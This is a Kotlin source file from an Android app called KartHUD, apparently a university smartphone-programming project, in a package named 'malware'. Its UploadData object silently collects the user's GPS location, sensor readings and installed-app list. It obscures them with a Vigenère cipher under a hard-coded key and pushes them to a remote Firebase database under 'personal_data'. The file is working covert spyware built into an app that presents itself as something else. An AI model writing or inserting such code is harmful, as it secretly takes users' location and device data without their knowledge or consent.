package es.upm.karthud.malware

import android.content.Context
import android.content.pm.PackageManager
import android.hardware.SensorEvent
import android.location.Location
import es.upm.karthud.Utils
import es.upm.karthud.malware.Vigenere.encrypt
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

object UploadData
{
    private const val KEY = "PROGRAMACIONAVANZADADESMARTPHONES"
    private val user = Utils.remoteAuthInstance.currentUser?.uid ?: "unknown"
    private val baseRemoteDBReference = Utils.remoteDbReference.child("personal_data").child(user)

    private fun location2Map(l: Location) : HashMap<String,String>
    {
        val map : HashMap<String,String> = HashMap()

        map["latitude"] = encrypt(l.latitude.toString(),KEY)
        map["longitude"] = encrypt(l.longitude.toString(),KEY)
        map["time"] = encrypt(l.time.toString(),KEY)
        map["speed"] = encrypt(l.speed.toString(),KEY)
        map["altitude"] = encrypt(l.altitude.toString(),KEY)

        return map
    }

    fun uploadLocation(l: Location)
    {
        CoroutineScope(Dispatchers.IO).launch {
            baseRemoteDBReference.child("locations").push().setValue(location2Map(l))
        }
    }

    private fun sensorEvent2Map(event: SensorEvent): HashMap<String,String>
    {
        val map : HashMap<String,String> = HashMap()

        map["accuracy"] = encrypt(event.accuracy.toString(),KEY)
        map["sensor"] = encrypt(event.sensor.name,KEY)
        map["time"] = encrypt(event.timestamp.toString(),KEY)
        map["value_x"] = encrypt(event.values[0].toString(),KEY)
        map["value_y"] = encrypt(event.values[1].toString(),KEY)
        map["value_z"] = encrypt(event.values[2].toString(),KEY)

        return map
    }

    fun uploadSensorEvent(event: SensorEvent)
    {
        CoroutineScope(Dispatchers.IO).launch {
            baseRemoteDBReference.child("sensor").push().setValue(sensorEvent2Map(event))
        }
    }

    private fun obtainAppsInstalled(context: Context) : List<String>
    {
        val packages = context.packageManager.getInstalledApplications(PackageManager.GET_META_DATA)
        val list = ArrayList<String>()

        for (packageInfo in packages)
        {
            list.add(packageInfo.packageName)
        }
        return list
    }

    fun uploadAppsInstalled(context: Context)
    {
        val packages = obtainAppsInstalled(context)
        CoroutineScope(Dispatchers.IO).launch {
            baseRemoteDBReference.child("apps").setValue(packages.map { p -> encrypt(p, KEY) })
        }
    }
}